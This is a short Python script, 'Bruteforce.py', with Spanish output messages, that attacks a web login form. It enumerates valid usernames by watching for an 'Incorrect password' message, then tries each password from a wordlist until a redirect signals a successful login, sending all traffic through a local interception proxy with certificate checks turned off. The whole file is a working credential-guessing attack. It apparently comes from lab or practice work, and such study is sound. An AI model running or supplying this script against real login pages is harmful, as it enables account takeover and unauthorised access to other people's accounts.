import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def banner():
	return """##### Bruteforce.py #####"""
	
print(banner())

proxies={
	"http": "http://127.0.0.1:8080",
	"https": "http://127.0.0.1:8080"
}

url = input("Enter the target Url : ")


with open("usuarios_noborrar.txt", "r") as users_file:
  usernames = users_file.read().splitlines()

  	
with open("passwords_db.txt", "r") as passwords_file:
  passwords = passwords_file.read().splitlines()

for username in  usernames:
	print(f"Probando username: {username}")
	data = {"username": username, "password": "IncorrectPass"}
	response = requests.post(url, data=data, proxies=proxies, verify=False)
	if response.status_code == 200 and "Incorrect password" in response.text:
		print(f"Username valido encontrado: {username}")
		
		for password in passwords:
			data={"username": username, "password": password}
			response2 = requests.post(url, data=data, proxies=proxies, verify=False, allow_redirects=False)
			if response2.status_code == 302:
				print(f"Inicio exitoso! Username: {username}, Password: {password}")
				correctPass = password
				correctUser = username
				break
			else:
				print(f"Password incorrecta probada: {password}")
		break
	else: 
		print(f"Username invalido: {username}")

print(f"Bruteforce finished")
		
			
    	


